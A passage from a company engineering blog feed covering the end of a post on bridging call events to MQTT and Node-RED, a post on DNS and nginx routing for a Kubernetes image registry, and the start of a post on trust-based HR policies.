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" width="1228" height="324"></p><p>Clicking this button takes you to the login page:</p><div class="post-images halves" markdown="1">![](/img/blog/mqtt-event-bridge/login-enter-phonenumber.png) ![](/img/blog/mqtt-event-bridge/login-pin.png)</div><p>… and then asks you to allow our service to get your voice event and new voicemails. As I am only interested in the voice events here, I’ll only grant that.</p><p>As this is an experimental app which hasn’t been approved by anyone, our login page will give you a clear warning about trusting this.</p><div class="post-images single" markdown="1">![](/img/blog/mqtt-event-bridge/login-consent.png)</div><p>When that is done, it returns to our app showing this beautiful UI (still not a designer):</p><p><img src="/assets/images/success-f636e03c8edb08ab9b6418c1311e02ec.png" width="1141" height="371"></p><p>The generated credentials will allow you to listen any topic matching <code>{phone number}/#</code>.</p><p>The following is the output from pasting that mosquitto_sub command in my terminal. It shows that I first called my Swedish number and hanging up before it was actually ringing.</p><div class="codeBlockContainer_I0IT language-json theme-code-block"><div class="codeBlockContent_wNvx json"><pre tabindex="0" class="prism-code language-json codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"event"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"metadata"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"sequence"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"1"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"ackInbox"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"_INBOX.VMTx7rnS0i3qXpHfuS5t3b"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"timestamp"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"2021-01-06T11:24:40Z"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"serviceId"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"wotel"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"voiceEvent"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"callId"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"0c056e2c-07f9-4c2b-b5ca-042f160af42f"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"type"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"CALL_INITIATED"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"fromNumber"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+4712345678"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"toNumber"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+46123456789"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"owner"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+46123456789"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"event"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"metadata"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"sequence"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"2"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"ackInbox"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"_INBOX.VMTx7rnS0i3qXpHfuS5t3b"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"timestamp"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"2021-01-06T11:24:43Z"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"serviceId"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"wotel"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"voiceEvent"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"callId"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"0c056e2c-07f9-4c2b-b5ca-042f160af42f"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"type"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"CALL_ENDED"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"fromNumber"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+4712345678"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"toNumber"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+46123456789"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"owner"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+46123456789"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>If you run any home automation or other hobby projects at home, chances are that you already have a MQTT broker running.
You could then setup bridging to not worry about credentials and TLS when consuming your events.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="wrapping-it-all-up">Wrapping it all up<a class="hash-link" href="#wrapping-it-all-up" title="Direct link to heading">​</a></h2><p>For this project I chose to use Node-RED, as it allows for very quick and easy to show drag-and-drop integrations.</p><p>To control the lamp, we did add the module <code>node-red-contrib-tradfri</code> as described in the Node-RED <a href="https://flows.nodered.org/node/node-red-contrib-tradfri" target="_blank" rel="noopener noreferrer">documentation</a>.</p><p>First we did add a <code>mqtt out</code> node configured to listen to the topic 46123456789/# with output as a parsed JSON object using the credentials we got on login.</p><p><img src="/assets/images/nodered-debug-d8a10d5399f2a33887d3237d43e8e4bf.png" width="1146" height="718"></p><p>We then simply hooked its output to a debug node. Looking at the output, we can see that the event object has a key <code>voiceEvent</code>, as this is a voice event.</p><p><img src="/assets/images/nodered-flow-958c30eb5b4cf4b283249d90f1f81122.png" width="1108" height="233"></p><p>Then we added a switch for handling it as a voice event if the voiceEvent key exists. Likewise, we added a new switch on the type field of that event.</p><p>Each of those functions simply set the Trådfri payload, as shown below:</p><div class="codeBlockContainer_I0IT language-json theme-code-block"><div class="codeBlockContent_wNvx json"><pre tabindex="0" class="prism-code language-json codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"state"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"on"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"color"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"cool daylight"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>As this was created quickly as a hackathon project, the intention was never to actually make anything useful. Using this quick flow, it is however clear that it could be very useful for when my wife tries to call me, but I am programming equipped with my noise-cancelling headphones.</p>]]></content>
        <author>
            <name>Gunnar Inge G. Sortland</name>
            <uri>https://www.linkedin.com/in/gunnaringe/</uri>
        </author>
        <category label="api" term="api"/>
        <category label="grpc" term="grpc"/>
        <category label="mqtt" term="mqtt"/>
        <category label="node-red" term="node-red"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Forbidden lore: hacking DNS routing for k8s]]></title>
        <id>forbidden-lore-hacking-dns-routing-for-k8s</id>
        <link href="https://www.wgtwo.com/blog/forbidden-lore-hacking-dns-routing-for-k8s"/>
        <updated>2020-12-11T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[At WG2 we’re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry. We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.]]></summary>
        <content type="html"><![CDATA[<p>At WG2 we’re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry. We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.</p><p>We recently decided to improve the registry solution by implementing <a href="https://goharbor.io/" target="_blank" rel="noopener noreferrer">Harbor</a> to scan images for vulnerabilities on upload, and replicating the registry into each of our multiple environments and regions. This would both eliminate Harbor as a single point of failure, and allow each cluster to pull images locally to minimise data transfer costs through the NAT gateway.</p><p>The overall workflow would look something like:</p><ul><li>images are built and uploaded to Harbor</li><li>Harbor scans for vulnerabilities and pushes images to a private registry</li><li>this registry is replicated to a read-only registry</li><li>the read-only registry is replicated to all environments and regions</li><li>the Kubernetes cluster in each environment deploys from the local read-only registry</li></ul><p><img alt="Workflow" src="/assets/images/multiregion-13365939553782c33c21219d2e21d410.jpg" width="736" height="331"></p><p>Harbor has to live somewhere, so we decided it should live in the dev environment, close to the CI system that builds the majority of our images. However, container image names contain the registry location that they are pulled from / pushed to, eg <code>reg.wgtwo.com/infra/logstash</code>. Therefore in the dev environment we have to find a way to deal with the fact that we want users and the CI system to push to Harbor, but we also want Kubernetes to pull images from the read-only registry.</p><p>So the main problem becomes: if the image name includes the url <code>reg.wgtwo.com</code>, how to make that point to two different places depending on usage?</p><h1>Solution 1: DNS</h1><p>In non-dev environments, the obvious solution is to redirect <code>reg.wgtwo.com -&gt; read-only-registry</code> in Kubernetes CoreDNS. But in dev, we need different services to go to different places. The DNS model thus needs to look like:</p><p><img alt="DNS" src="/assets/images/dnsresolution-d0a90858bbeab60834fd5f80b85a9ba5.jpg" width="702" height="483"></p><p>In other words,</p><ul><li><code>Route53</code> sets <code>reg.wgtwo.com -&gt; harbor</code></li><li>K8s coreDNS sets <code>reg.wgtwo.com -&gt; read-only-registry</code></li><li>CI (Concourse) bypasses cluster lookup and goes to <code>Route53</code> instead, such that <code>reg.wgtwo.com -&gt; harbor</code></li></ul><p>We initially deployed a DNS sidecar to the CI system, but with multiple Concourse pods we got multiple sidecars and we really only needed one, plus we had to manipulate Concourse’s internal DNS cache (<code>CONCOURSE_GARDEN_DNS_SERVER</code>) but that broke DNS between Concourse and everything else in the cluster. Replacing the sidecar with a DNS pod in the CI namespace worked better, although then all the CI jobs needed to be updated to use that new pod as their nameserver.</p><p><img alt="Sleight of hand" src="/assets/images/sleight-of-hand-fbae8de3401322c1485949179d2a6f32.gif" width="455" height="248"></p><p>However at this point we realised that although we want to deploy pods into Kubernetes, the process that does the deploying lives on the Kubernetes nodes, outside of cluster scope.
We don’t do any config management on the nodes, we just let <a href="https://github.com/kubernetes/kops" target="_blank" rel="noopener noreferrer">kOps</a> deploy everything that Kubernetes needs for a cluster, so we were reluctant to introduce an entirely different system just for managing one <code>resolv.conf</code> file. Also the concentric DNS setup would have a very wide scope and be somewhat difficult to debug. Maybe this was a problem better resolved using some clever nginx routing?</p><h1>Solution 2: nginx</h1><p>If we could find some way of differentiating the Harbor traffic from read-only-registry traffic, we could let nginx route requests to the right place.</p><iframe src="https://giphy.com/embed/QaPkV29BJh3gI" width="240" height="177" frameborder="0" class="giphy-embed" allowfullscreen=""></iframe><h1>Solution 2a: nginx routes traffic on IP</h1><ul><li>Traffic from the outside world plus traffic from Concourse needs to go to Harbor.</li><li>Traffic from the Kubernetes cluster needs to go to the read-only-registry.</li></ul><p>The <a href="http://nginx.org/en/docs/http/ngx_http_geo_module.html" target="_blank" rel="noopener noreferrer">nginx geo module</a> sounded like a good idea, where we could set our internal subnet ranges to go to the read-only-registry. However getting the ingress annotations to put this config in the right place turned out to be challenging, since it needs to go outside of both <code>http snippet</code> and <code>server snippet</code> blocks. But before we dug further into this issue we realised that all of the traffic to nginx would arrive via the internet gateway, meaning we wouldn’t see source IP anyway.</p><h1>Solution 2b: nginx routes on custom header</h1><p>The new <code>canary</code> feature in nginx makes this kind of routing very easy - traffic that matches a certain criteria gets sent to a different backend. We could use a custom header such as <code>ro-reg</code> to send internal traffic to the read-only registry.</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">annotations:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  nginx.ingress.kubernetes.io/canary: "true"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  nginx.ingress.kubernetes.io/canary-by-header: "ro-reg"</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>The docker (client) config has an <a href="https://github.com/docker/cli/blob/master/man/docker-config-json.5.md" target="_blank" rel="noopener noreferrer">HttpHeaders</a> section, so it would be easy enough to add this section to all of our image-pull secrets, meaning all internal pulls - but nothing else - should go to the read-only registry.</p><p>We had to rearrange things a little in order to terminate SSL on nginx and not at the registry so that nginx would be able to read the headers, but that was straightforward.</p><p>In our initial tests from the laptop, this worked great. However it quickly transpired that this was the only place it worked from. Where we needed it to work from - the Kubernetes nodes - didn’t run Docker, they run <code>docker-shim</code> on top of <code>containerd</code>, and <code>HttpHeaders</code> <a href="https://github.com/containerd/cri/issues/1400" target="_blank" rel="noopener noreferrer">are not implemented yet</a>. Back to the drawing board.</p><h1>Solution 2c: nginx routes on auth header</h1><p>Getting nervous that we’d used a week to get nothing working, we started clutching at some very hacky straws. Even if docker-shim doesn’t send custom headers, we could see it sending auth headers, and we have different login details for Harbor versus the read-only registry. We wondered if we could route on the auth hash, postponing entirely the discussion about whether we should do such a horrible thing, or the security implications of having the auth hash in a plaintext nginx config.</p><iframe src="https://giphy.com/embed/I8RMi1UY8cEKs" frameborder="20px" class="giphy-embed" allowfullscreen=""></iframe><p>We soon discovered that this solution was also never going to work. In Kubernetes, it is the <code>kubelet</code> process that does the image pull at the start of a pod deployment, and after some wiresharking it turns out that the very first thing kubelet does is make an unauthenticated call to the <code>registry/v2</code> endpoint to fetch metadata which it then uses to begin authentication.</p><p>This is expected behaviour for a docker registry, <a href="https://docs.docker.com/registry/spec/auth/token/" target="_blank" rel="noopener noreferrer">according to documentation</a>, but with nginx routing on auth header, it meant that the initial call was routed to Harbor which sent back an auth URL also for Harbor, and thus kubelet never even arrived at the read-only registry, let alone managed to authenticate.</p><h1>Aside: other issues with headers</h1><p>During this debugging session we also realised that we’d been creating image-pull secrets in Kubernetes with both <code>.dockercfg</code> and <code>.dockerconfigjson</code>, not realising that <code>.dockercfg</code> <a href="https://github.com/moby/moby/pull/12009" target="_blank" rel="noopener noreferrer">is the old format</a> and that <code>.dockercfg</code> likely does not support HttpHeaders at all.</p><p>Kubelet <a href="https://github.com/Kubernetes/Kubernetes/blob/e1fd2d7ff57af153023347d72d17226effd917c8/pkg/credentialprovider/config.go#L44" target="_blank" rel="noopener noreferrer">does support HttpHeaders</a>, but relies on the underlying container runtime to also support them - which is not the case for containerd.</p><p>Additionally, when creating a Kubernetes secret containing <code>.dockerconfigjson</code>, it appears that it is very important that there is no whitespace in the secret, or authentication will fail.</p><h1>Solution 2d: route on some other inherent header</h1><p>As one final attempt at making nginx routing work, we looked for other headers being sent, but there was no single header that let us differentiate between kubelet, laptop, and Concourse.</p><p>Kubelet sends a useragent of either <code>docker</code> or <code>go-http-agent</code> (depending on whether the call is the initial one or a retrial) and filtering on <code>go-http-agent</code> also catches Concourse requests, rendering it useless for this task. We were also worried it might end up catching all sorts of unintended cases since we have quite a lot of <code>go</code>-based applications in our ecosystem.</p><p>We took a moment to mourn the loss of our nginx idea, and went back to a DNS solution.</p><p><img alt="Mourn" src="/assets/images/pulpfiction-14c68561ce1cdd95a2ad42f3fde27b1e.jpg" width="800" height="450"></p><h1>Solution 3: DNS, again</h1><p>We put the DNS solution back in place again, where</p><ul><li><code>Route53</code> sets <code>reg.wgtwo.com -&gt; harbor</code></li><li>K8s nodes set <code>reg.wgtwo.com -&gt; read-only-registry</code></li><li>K8s coreDNS sets <code>reg.wgtwo.com -&gt; read-only-registry</code></li><li>CI runs an additional coreDNS pod setting <code>reg.wgtwo.com -&gt; harbor</code></li><li>Concourse uses CI coreDNS pod to set <code>reg.wgtwo.com -&gt; harbor</code></li></ul><p>Which brought us back to the problem that was still there: how to update <code>/etc/resolv.conf</code> on the nodes. In the continued absence of config management, we hit upon the wonderful hack of using a privileged pod daemonset to manage the config for us via systemd.</p><p>The privileged pod on each node would write a new config file to <code>/etc/systemd/resolvd.conf</code>, and then restart the systemd service to update the running resolvd process.</p><p>This would thus control configuration on the Kubernetes node from inside of Kubernetes, which is admittedly morally wrong but also works really well. It also keeps the configuration alongside all the rest of our configuration instead of hidden away somewhere new.</p><p><img alt="wheel change" src="/assets/images/wheelchange-57e19e4d177f74c50d800c3268440f30.gif" width="500" height="282"></p><p>A future solution might be to implement some kind of local DNS server/cache on each node, but for now we’ll settle for a working system and a huge increase in knowledge about the inner workings of many of our components.</p>]]></content>
        <author>
            <name>Anna Kennedy</name>
            <uri>https://www.linkedin.com/in/annaken</uri>
        </author>
        <author>
            <name>Holger Ihrig</name>
            <uri>https://www.linkedin.com/in/hihrig/</uri>
        </author>
        <author>
            <name>Matt Long</name>
            <uri>https://www.linkedin.com/in/mattlong/</uri>
        </author>
        <author>
            <name>Yan Grunenberger</name>
            <uri>https://www.linkedin.com/in/yangrunenberger/</uri>
        </author>
        <category label="dns" term="dns"/>
        <category label="nginx" term="nginx"/>
        <category label="kubernetes" term="kubernetes"/>
        <category label="infrastructure" term="infrastructure"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[We're all grownups here]]></title>
        <id>were-all-grownups-here</id>
        <link href="https://www.wgtwo.com/blog/were-all-grownups-here"/>
        <updated>2020-11-20T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[I have always struggled with company HR policies that make me not feel trusted. Why don’t HR and/or management trust who they hire? Why create HR processes for the very few people who don’t behave? Shouldn’t processes be designed for the vast majority of people who are to be trusted? I just don’t get it. If you are given freedom it comes with a lot of responsibility, isn’t that rather implicit?]]></summary>
        <content type="html"><![CDATA[<p>I have always struggled with company HR policies that make me not feel trusted. Why don’t HR and/or management trust who they hire? Why create HR processes for the very few people who don’t behave? Shouldn’t processes be designed for the vast majority of people who are to be trusted? I just don’t get it. If you are given freedom it comes with a lot of responsibility, isn’t that rather implicit?</p><p>It comes down to a choice - minimize risk by implementing all possible controls, or trust people and implement necessary controls only. We believe the latter drives ownership, motivation and a better product and company. That doesn’t mean it is easy though - the need to control is a fundamental human need, and we need daily reminders to always push in the opposite direction.</p><p>When I was in discussions with Erlend (our CEO) about joining <strong>wgtwo</strong>, the term “startup for grownups” was used and I remember thinking “huh, that makes sense”. Now, 2 years in, the simple fact that yes we are all grownups here and we all deserve to be treated as such has become an embedded part of our company culture.</p><p>I wanted to give you some tangible examples of how we do things. For context, we are a startup tech company with a team of ~50 (87% engineers). We have offices in Oslo, Trondheim, Stockholm, a hub in Germany and remote team members in Japan, Spain, the U.S., Canada, London and Myanmar.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="what-approvals">What approvals?<a class="hash-link" href="#what-approvals" title="Direct link to heading">​</a></h2><p>We try to minimize that amount of approvals necessary to a minimum. Here is how we communicate that to new hires in some of the areas companies typically have approvals</p><ul><li>Vacation: Yes, we do have the standard 25 days of vacation (standard in the Nordics) in our contracts. But, we also trust you to know yourself best, and understand that no year or situation is the same. Sometimes you might need more, sometimes less. As long as it works for your team, we trust you to make a judgement. We also trust that you take enough time off as we all need time off to reset and recharge.</li><li>Expenses: We trust your judgement and that you wouldn’t be making the purchase if it wasn’t necessary for you and the team. This applies when deciding on which equipment 